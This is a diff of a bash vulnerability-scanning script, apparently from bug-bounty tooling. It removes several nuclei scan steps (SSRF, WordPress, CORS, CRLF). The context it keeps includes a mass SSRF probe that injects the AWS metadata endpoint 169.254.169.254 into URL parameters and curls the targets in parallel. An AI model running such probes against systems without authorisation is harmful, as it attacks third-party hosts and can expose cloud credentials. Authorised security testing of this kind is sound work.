@@ -167,21 +167,9 @@ if [[ -s "$ALLPARAMS" ]]; then
 
     cat "$OUTDIR/redirect_params.txt" | qsreplace 'http://169.254.169.254/latest/meta-data/hostname' | xargs -I % -P 25 sh -c 'resp=$(curl -ks --max-time 5 "%"); if echo "$resp" | grep -q "compute.internal"; then echo "SSRF VULN! %" >> "$OUTDIR/ssrf_aws"; fi'
 
-    nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/blind-ssrf.yaml -l "$OUTDIR/redirect_params.txt" --retries 2 --dast -o "$OUTDIR/ssrf_nuclei_blind.txt" -stats
-    nuclei -t ~/nuclei-templates/dast/vulnerabilities/ssrf/response-ssrf.yaml -l "$OUTDIR/redirect_params.txt" --retries 2 --dast -o "$OUTDIR/ssrf_nuclei_response.txt" -stats
-
-    echo "[*] WordPress Testing..."
-    nuclei -l "$LIVE_INPUT" -t ~/nuclei-templates/http/vulnerabilities/wordpress -o "$OUTDIR/wordpress_vuln.txt" -stats -retries 2
-    nuclei -l "$LIVE_INPUT" -t ~/nuclei-templates/http/technologies/wordpress-detect.yaml -o "$OUTDIR/wordpress_detect.txt" -stats -retries 2
-
-    echo "[*] CORS Misconfigurations..."
-    nuclei -l "$LIVE_INPUT" -tags cors -o "$OUTDIR/nuclei_cors.txt" -stats
 
     echo "[*] CRLF Injection..."
     crlfuzz -l "$LIVEDOMAINS" | tee -a "$OUTDIR/crlf_crlfuzz.txt"
-    nuclei -t ~/nuclei-templates/dast/vulnerabilities/crlf/ -l "$LIVEDOMAINS" -dast -o "$OUTDIR/crlf_nuclei_out1.txt" -stats -retries 2
-    nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/crlf-injection-generic.yaml -l "$LIVEDOMAINS" -o "$OUTDIR/crlf_nuclei_out2.txt" -stats -retries 2
-    nuclei -t ~/nuclei-templates/http/vulnerabilities/other/viewlinc-crlf-injection.yaml -l "$LIVEDOMAINS" -o "$OUTDIR/crlf_nuclei_out3.txt" -stats -retries 2
 fi
 
 # Final wrap-up
